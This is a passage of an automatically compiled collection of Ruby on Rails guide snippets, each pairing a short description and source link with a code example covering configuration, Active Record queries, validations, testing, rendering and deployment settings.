[200, nil]) %>\n  <% end %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: English Currency Symbol Configuration\nDESCRIPTION: YAML configuration for the English currency symbol used in the improper abstraction example.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_23\n\nLANGUAGE: yaml\nCODE:\n```\n# config/locales/en.yml\nen:\n  currency: \"$\"\n```\n\n----------------------------------------\n\nTITLE: Using web-console in a View Template\nDESCRIPTION: Demonstrates how to include a debugging console directly in a view template using the web-console gem. This renders an interactive Ruby console alongside the HTML content, allowing debugging in the context of the view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_32\n\nLANGUAGE: html+erb\nCODE:\n```\n<% console %>\n\n<h2>New Post</h2>\n```\n\n----------------------------------------\n\nTITLE: Configuring Solid Cache with SQLite in database.yml\nDESCRIPTION: This snippet demonstrates configuring Solid Cache to use a separate SQLite database in the `config/database.yml` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_24\n\nLANGUAGE: yaml\nCODE:\n```\nproduction:\n  primary:\n    <<: *default\n    database: storage/production.sqlite3\n  cache:\n    <<: *default\n    database: storage/production_cache.sqlite3\n    migrations_paths: db/cache_migrate\n```\n\n----------------------------------------\n\nTITLE: Query Schema Migrations Table - SQL\nDESCRIPTION: This SQL query retrieves all records from the `schema_migrations` table. This allows viewing the version numbers of all migrations that have been run on the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_72\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM schema_migrations;\n```\n\n----------------------------------------\n\nTITLE: Separating Responsibilities with Module#concerning - Ruby\nDESCRIPTION: The `Module#concerning` method allows developers to divide class responsibilities into cohesive, easily located sections with descriptive labels. This reduces boilerplate and clarifies code organization. Available via ActiveSupport extensions. Can be used within classes to group related methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_19\n\nLANGUAGE: Ruby\nCODE:\n```\nclass User\n  concerning :PasswordManagement do\n    def reset_password\n      # ...\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating a New Resource in Rails API\nDESCRIPTION: Commands to generate a scaffold for a new 'Group' resource with a 'name' attribute, and to update the database schema.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails g scaffold Group name:string\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: String Starts/Ends With\nDESCRIPTION: This snippet demonstrates the use of `starts_with?` and `ends_with?` methods on strings to check if a string starts or ends with a specific substring.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_53\n\nLANGUAGE: ruby\nCODE:\n```\n\"foo\".starts_with?(\"f\") # => true\n\"foo\".ends_with?(\"o\")   # => true\n```\n\n----------------------------------------\n\nTITLE: Passing Arguments to Rake Tasks in Ruby\nDESCRIPTION: Demonstrates how to define a rake task that accepts arguments. This example shows how to define and access arguments within the task block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\ntask :task_name, [:arg_1] => [:prerequisite_1, :prerequisite_2] do |task, args|\n  argument_1 = args.arg_1\nend\n```\n\n----------------------------------------\n\nTITLE: Running Rails Tests via Command Line (Specific File)\nDESCRIPTION: This code snippet demonstrates how to run a specific test file in a Rails application using the `bin/rails test` command followed by the path to the desired test file.  The path is relative to the Rails root directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_17\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test test/models/article_test.rb\n```\n\n----------------------------------------\n\nTITLE: Checking for Associated Account Presence - Ruby\nDESCRIPTION: Checks if the Supplier's Account exists. If not, assigns a message to @msg. A common Rails conditional idiom for reporting missing associations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nif @supplier.account.nil?\\n  @msg = \\\"No account found for this supplier\\\"\\nend\n```\n\n----------------------------------------\n\nTITLE: Testing Action Cable Channel with Connection Identifiers\nDESCRIPTION: This code demonstrates how to test an Action Cable channel using connection identifiers. It uses `stub_connection` to simulate a user and asserts that the connection is subscribed to a stream for that user.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_108\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass WebNotificationsChannelTest < ActionCable::Channel::TestCase\n  test \"subscribes and stream for user\" do\n    stub_connection current_user: users(:john)\n\n    subscribe\n\n    assert_has_stream_for users(:john)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Digested Asset References in ERB Templates\nDESCRIPTION: Examples of using Rails asset helpers to reference digested assets in views, including stylesheet and image tags with Turbo support.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_6\n\nLANGUAGE: erb\nCODE:\n```\n<%= stylesheet_link_tag \"application\", media: \"all\" %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= stylesheet_link_tag \"application\", \"data-turbo-track\": \"reload\" %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag \"rails.png\" %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag \"icons/rails.png\" %>\n```\n\n----------------------------------------\n\nTITLE: Implementing Session Expiry in Rails Database\nDESCRIPTION: A class method to expire sessions stored in a database. It deletes all sessions that haven't been updated within a specified time period, helping to mitigate risks from long-lived sessions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nclass Session < ApplicationRecord\n  def self.sweep(time = 1.hour)\n    where(updated_at: ...time.ago).delete_all\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Adding a Framework Configuration Option in Ruby\nDESCRIPTION: Shows how to define a new configuration setting (`existing_behavior`) within a Rails framework module (Active Job) using `mattr_accessor`. A default value (`true`) is provided, representing the current behavior before the breaking change, ensuring backward compatibility during upgrades.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nmodule ActiveJob\n  mattr_accessor :existing_behavior, default: true\nend\n```\n\n----------------------------------------\n\nTITLE: Checking object existence with exists? in Rails\nDESCRIPTION: Demonstrates how to use `exists?` to check for the existence of an object or records matching certain criteria. This method returns `true` or `false` instead of an object or collection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_201\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.exists?(1)\n```\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.exists?(id: [1, 2, 3])\n# or\nCustomer.exists?(first_name: [\"Jane\", \"Sergei\"])\n```\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(first_name: \"Ryan\").exists?\n```\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.exists?\n```\n\n----------------------------------------\n\nTITLE: Running Generators with generate\nDESCRIPTION: Demonstrates how to run a Rails generator with specified arguments using the `generate` method. The example runs a scaffold generator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\ngenerate(:scaffold, \"person\", \"name:string\", \"address:text\", \"age:number\")\n```\n\n----------------------------------------\n\nTITLE: Customizing Length Validation Error Messages in Rails (Ruby)\nDESCRIPTION: Shows how to provide custom error messages for the `length` validator in a `Person` model. This example customizes the message for the `:maximum` constraint on the `bio` attribute using the `:too_long` option, which includes the `%{count}` placeholder for the specified limit.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :bio, length: { maximum: 1000,\n    too_long: \"%\\{count} characters is the maximum allowed\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Example Payload for start_processing.action_controller Hook in Ruby\nDESCRIPTION: Provides an example Ruby Hash representing the payload sent with the `start_processing.action_controller` notification. This event fires at the beginning of controller action processing. The payload includes details like controller name, action, request parameters (unfiltered), request headers, format (e.g., :html), HTTP method, and the request path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  controller: \"PostsController\",\n  action: \"new\",\n  params: { \"action\" => \"new\", \"controller\" => \"posts\" },\n  headers: #<ActionDispatch::Http::Headers:0x0055a67a519b88>,\n  format: :html,\n  method: \"GET\",\n  path: \"/posts/new\"\n}\n```\n\n----------------------------------------\n\nTITLE: Asserting Two-Way Route Mapping (Ruby)\nDESCRIPTION: Checks route mapping in both directions. The first argument describes the input path and HTTP method. The second argument is a hash containing the expected controller and action. The assertion confirms that the path generates the provided options, and vice versa.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_90\n\nLANGUAGE: ruby\nCODE:\n```\nassert_routing({ path: \"photos\", method: :post }, { controller: \"photos\", action: \"create\" })\n```\n\n----------------------------------------\n\nTITLE: Defining Inheritance in Ruby on Rails Models\nDESCRIPTION: This Ruby code snippet demonstrates how to create an Admin model that inherits from the User model, including a presence validation for the 'name' attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nclass Admin < User\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Error Messages in Rails\nDESCRIPTION: This snippet shows how to generate error messages from error objects. It demonstrates the difference between message and full_message methods for formatting error messages.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_68\n\nLANGUAGE: ruby\nCODE:\n```\nirb> error.message\n=> \"is too short (minimum is 3 characters)\"\nirb> error.full_message\n=> \"Name is too short (minimum is 3 characters)\"\n```\n\n----------------------------------------\n\nTITLE: Accessing Counter Variables in Partials in Rails\nDESCRIPTION: This example demonstrates accessing a counter variable (`product_counter`) within a partial rendered for a collection. The counter variable indicates the number of times the partial has been rendered within the enclosing view, starting at 0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_23\n\nLANGUAGE: erb\nCODE:\n```\n<%# index.html.erb %>\n<%= render partial: \"product\", collection: @products %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%# _product.html.erb %>\n<%= product_counter %> # 0 for the first product, 1 for the second product...\n```\n\n----------------------------------------\n\nTITLE: Declaring Inheritable Class Attributes with class_attribute\nDESCRIPTION: This Ruby code snippet demonstrates how to use the `class_attribute` method to declare inheritable class attributes that can be overridden at any level of the class hierarchy. The `class_attribute` method creates getter and setter methods for the class attribute. It also creates instance methods that proxy to the class attribute. The example showcases how changes to the attribute in a subclass do not affect the attribute in the superclass.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nclass A\n  class_attribute :x\nend\n\nclass B < A; end\n\nclass C < B; end\n\nA.x = :a\nB.x # => :a\nC.x # => :a\n\nB.x = :b\nA.x # => :a\nC.x # => :b\n\nC.x = :c\nA.x # => :a\nB.x # => :b\n```\n\n----------------------------------------\n\nTITLE: Generating URLs with url_for Helper in Ruby\nDESCRIPTION: Illustrates the `url_for` helper in Rails Action View. It generates a URL string based on the provided options, typically Active Record objects or arrays containing objects and parameters. It handles routing, including composite primary keys and query parameters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nurl_for @profile\n# => /profiles/1\n```\n\nLANGUAGE: ruby\nCODE:\n```\nurl_for [ @hotel, @booking, page: 2, line: 3 ]\n# => /hotels/1/bookings/1?line=3&page=2\n```\n\nLANGUAGE: ruby\nCODE:\n```\nurl_for @post # given a composite primary key [:blog_id, :id]\n# => /posts/1_2\n```\n\n----------------------------------------\n\nTITLE: Rendering Raw File in Rails\nDESCRIPTION: This snippet shows how to render a raw file from an absolute path in Rails. This can be useful for rendering static files like error pages. It renders the file within the current layout by default, but this can be disabled with `layout: false`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nrender file: \"#{Rails.root}/public/404.html\", layout: false\n```\n\n----------------------------------------\n\nTITLE: Configuring Connection Retries for MySQL (YAML)\nDESCRIPTION: This YAML snippet configures the number of connection retries for MySQL in the development environment. If a connection fails, Rails will automatically retry certain idempotent queries up to the specified number of times.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_97\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: mysql2\n  connection_retries: 3\n```\n\n----------------------------------------\n\nTITLE: Rendering JSON\nDESCRIPTION: Demonstrates rendering a JSON response from a controller. The `render json:` method automatically converts the object to JSON.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nrender json: @product\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for render_collection.action_view in Ruby\nDESCRIPTION: This snippet demonstrates the payload for the `render_collection.action_view` event. The Ruby hash contains the `:identifier` (template path), the `:count` (collection size), and optionally `:cache_hits` (number of partials fetched from cache, included only if rendered with `cached: true`).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  identifier: \"/Users/adam/projects/notifications/app/views/posts/_post.html.erb\",\n  count: 3,\n  cache_hits: 0\n}\n```\n\n----------------------------------------\n\nTITLE: Rails AJAX Request Test Ruby\nDESCRIPTION: Demonstrates how to test AJAX requests in Rails. The example makes a GET request, asserting the response body and media type. It fetches an article via xhr and checks response.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"AJAX request\" do\n  article = articles(:one)\n  get article_url(article), xhr: true\n\n  assert_equal \"hello world\", @response.body\n  assert_equal \"text/javascript\", @response.media_type\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Puma workers with environment variables\nDESCRIPTION: Sets the number of Puma worker processes using the WEB_CONCURRENCY environment variable. The 'auto' setting automatically adjusts worker count based on available CPUs, though this may be inaccurate on some cloud platforms with shared CPUs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/tuning_performance_for_deployment.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nWEB_CONCURRENCY=auto\n```\n\n----------------------------------------\n\nTITLE: Adding a Deprecation Warning in Ruby\nDESCRIPTION: Demonstrates how to implement a deprecation warning for a method (`deprecated_method`) that is planned for removal. It uses the framework's deprecator (`ActiveRecord.deprecator.warn` in this example) to log a warning message specifying the deprecated method and the target removal version (Rails 7.1), while still executing the original method's behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\ndef deprecated_method\n  ActiveRecord.deprecator.warn(<<-MSG.squish)\n    `ActiveRecord::Base.deprecated_method` is deprecated and will be removed in Rails 7.1.\n  MSG\n  # Existing behavior\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Table with Database Options (Ruby)\nDESCRIPTION: This migration shows how to create a `products` table and pass database-specific options, like setting the engine to `BLACKHOLE` for MySQL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_34\n\nLANGUAGE: Ruby\nCODE:\n```\ncreate_table :products, options: \"ENGINE=BLACKHOLE\" do |t|\n  t.string :name, null: false\nend\n```\n\n----------------------------------------\n\nTITLE: Enqueueing Multiple Jobs at Once with perform_all_later\nDESCRIPTION: Examples of using the new perform_all_later method to efficiently enqueue multiple ActiveJob jobs simultaneously, which reduces overhead when working with batches of jobs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n# Enqueueing individual jobs\nActiveJob.perform_all_later(MyJob.new(\"hello\", 42), MyJob.new(\"world\", 0))\n\n# Enqueueing an array of jobs\nuser_jobs = User.pluck(:id).map { |id| UserJob.new(user_id: id) }\nActiveJob.perform_all_later(user_jobs)\n```\n\n----------------------------------------\n\nTITLE: Formatting Numbers as Currency in Ruby\nDESCRIPTION: Shows how to format numbers as currency strings using `to_fs(:currency)`, including options for precision. This is part of ActiveSupport core extensions to the Numeric class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_99\n\nLANGUAGE: ruby\nCODE:\n```\n1234567890.50.to_fs(:currency)                 # => $1,234,567,890.50\n1234567890.506.to_fs(:currency)                # => $1,234,567,890.51\n1234567890.506.to_fs(:currency, precision: 3)  # => $1,234,567,890.506\n```\n\n----------------------------------------\n\nTITLE: Retrieving multiple first records in Rails\nDESCRIPTION: This code demonstrates how to retrieve multiple records from the `Customer` model using the `first` method with a numerical argument. It fetches the specified number of records ordered by the primary key (default).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_20\n\nLANGUAGE: irb\nCODE:\n```\nirb> customers = Customer.first(3)\n=> [#<Customer id: 1, first_name: \"Lifo\">, #<Customer id: 2, first_name: \"Fifo\">, #<Customer id: 3, first_name: \"Filo\">]\n```\n\n----------------------------------------\n\nTITLE: Setting Active Storage Service in Rails Environment\nDESCRIPTION: Ruby code to set the Active Storage service for different Rails environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\n# Development environment\nconfig.active_storage.service = :local\n\n# Production environment\nconfig.active_storage.service = :amazon\n\n# Test environment\nconfig.active_storage.service = :test\n```\n\n----------------------------------------\n\nTITLE: Using after_all_transactions_commit in ActiveRecord\nDESCRIPTION: This snippet demonstrates how to use `ActiveRecord.after_all_transactions_commit` to execute code after all the current transactions have been successfully committed to the database. It includes nested transactions, where the callback is only triggered after the outermost transaction commits.  The example delivers a notification email after an article is published.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\ndef publish_article(article)\n  Article.transaction do\n    Post.transaction do\n      ActiveRecord.after_all_transactions_commit do\n        PublishNotificationMailer.with(article: article).deliver_later\n        # An email will be sent after the outermost transaction is committed.\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Asset Pipeline in application.rb\nDESCRIPTION: Configuration settings for enabling the asset pipeline in Rails 3.1, including enabling assets and setting the asset version. Also includes an optional setting for changing the asset prefix.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.assets.enabled = true\nconfig.assets.version = '1.0'\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# Defaults to '/assets'\nconfig.assets.prefix = '/asset-files'\n```\n\n----------------------------------------\n\nTITLE: Removing Scoping with unscoped in Rails\nDESCRIPTION: The `unscoped` method removes all scoping, including `default_scope`, from a query. It allows executing a normal query on the table, ignoring any predefined scopes. This snippet demonstrates how to use `unscoped` with and without a block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_169\n\nLANGUAGE: ruby\nCODE:\n```\nBook.unscoped.load\n```\n\n----------------------------------------\n\nTITLE: Checkboxes Example - ERB\nDESCRIPTION: This snippet demonstrates how to create a group of checkboxes using the form builder in ERB. It generates three checkboxes with labels: Biography, Romance, and Mystery. Each checkbox will submit a value of '1' if checked and '0' if unchecked.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_4\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.checkbox :biography %>\n<%= form.label :biography, \"Biography\" %>\n<%= form.checkbox :romance %>\n<%= form.label :romance, \"Romance\" %>\n<%= form.checkbox :mystery %>\n<%= form.label :mystery, \"Mystery\" %>\n```\n\n----------------------------------------\n\nTITLE: Overriding author_class Getter Method\nDESCRIPTION: Ruby code to override the author_class getter method to always call constantize on the class name before returning.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\ndef self.author_class\n  @@author_class.constantize\nend\n```\n\n----------------------------------------\n\nTITLE: Example of Bad vs. Good Pronoun Usage in Documentation\nDESCRIPTION: Shows how to avoid direct address (\"you\"/\"your\") in documentation by using passive voice or alternative constructions that focus on the action rather than the reader.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\n# BAD\n# If you need to use +return+ statements in your callbacks, it is\n# recommended that you explicitly define them as methods.\n\n# GOOD\n# If +return+ is needed, it is recommended to explicitly define a\n# method.\n```\n\n----------------------------------------\n\nTITLE: Configuring Model with accepts_nested_attributes_for in Rails\nDESCRIPTION: This snippet shows how to configure a `Person` model to accept nested attributes for its associated `addresses`. `accepts_nested_attributes_for :addresses` creates an `addresses_attributes=` method which is used to create, update, and destroy addresses through the `Person` model. The `Address` model is also defined with a `belongs_to` association to the `Person` model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_76\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  has_many :addresses, inverse_of: :person\n  accepts_nested_attributes_for :addresses\nend\n\nclass Address < ApplicationRecord\n  belongs_to :person\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Autoload for Lib Directory in Rails 7.1+\nDESCRIPTION: This snippet shows how to use the config.autoload_lib method to add the lib directory to autoload paths while ignoring specific subdirectories.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.autoload_lib(ignore: %w(assets tasks))\n```\n\n----------------------------------------\n\nTITLE: Defining belongs_to Association in Rails Model\nDESCRIPTION: Demonstrates how to define a belongs_to association in a Rails model. This example shows the Book model declaring its relationship with the Author model through a belongs_to association.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_93\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author\nend\n```"
  }
]